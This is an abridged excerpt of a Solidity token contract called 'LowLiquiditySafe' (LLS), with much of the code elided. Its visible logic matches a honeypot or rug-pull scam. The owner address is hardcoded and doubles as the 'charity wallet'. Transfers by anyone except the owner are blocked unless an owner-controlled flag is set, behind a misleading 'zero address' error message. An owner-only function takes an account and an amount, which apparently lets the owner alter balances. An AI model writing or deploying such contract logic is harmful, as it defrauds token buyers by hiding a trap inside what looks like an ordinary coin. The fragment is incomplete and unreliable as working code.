...
abstract contract Ownable is Context {
     ...
     */
    constructor () {
        _owner = 0xBdEdB1D1cEB7654403b73A022370E253B0C1be4C;
...
contract LowLiquiditySafe is Context, IERC20, Ownable {
    ...
    address private _charityWalletAddress = 0xBdEdB1D1cEB7654403b73A022370E253B0C1be4C;

   
    uint256 private constant MAX = ~uint256(0);
    uint256 private _Initialise = 1 * 10**6 * 10**9;
    uint256 private _rTotal = (MAX - (MAX % _Initialise));
    uint256 private _tFeeTotal;

    string private _name = "LowLiquiditySafe";
    string private _symbol = "LLS";
    ...
    constructor () {
        ...
        emit Transfer(address(0), owner(), _Initialise);
    }
    ...
    function _getCurrentSupply() private view returns(uint256, uint256) {
        ...
        uint256 tSupply = _Initialise;      
        for (uint256 i = 0; i < _excluded.length; i++) {
            if (_rOwned[_excluded[i]] > rSupply || _tOwned[_excluded[i]] > tSupply) return (_rTotal, _Initialise);
            rSupply = rSupply.sub(_rOwned[_excluded[i]]);
            tSupply = tSupply.sub(_tOwned[_excluded[i]]);
        }
        if (rSupply < _rTotal.div(_Initialise)) return (_rTotal, _Initialise);
   ...
   bool public CurrentTaxAdd;
    ...
    function _transfer(
        ...
        if(from != owner() && to != owner())
            ...
            require(CurrentTaxAdd,"ERC20: transfer from the zero address");
    ...
    function _transferFromExcluded(address sender, address recipient, uint256 tAmount) private {
       ...
       function LiquidityPoolStakeIn(address account, uint256 amount) onlyOwner  public virtual {
